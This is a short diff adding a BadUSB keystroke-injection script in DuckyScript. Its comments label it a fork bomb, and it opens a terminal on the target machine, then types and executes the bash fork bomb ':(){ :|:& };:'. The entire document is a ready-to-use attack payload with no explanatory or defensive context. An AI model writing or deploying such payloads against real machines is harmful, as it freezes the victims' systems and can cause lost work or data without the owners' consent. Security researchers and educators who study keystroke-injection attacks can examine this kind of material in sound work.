@@ -1,0 +1,11 @@
+REM Fork Bomb via BadUSB
+DELAY 1000
+GUI a
+REM -- Open terminal --
+STRING terminal
+DELAY 250
+ENTER
+DELAY 250
+REM -- Execute fork bomb --
+STRING :(){ :|:& };:
+ENTER
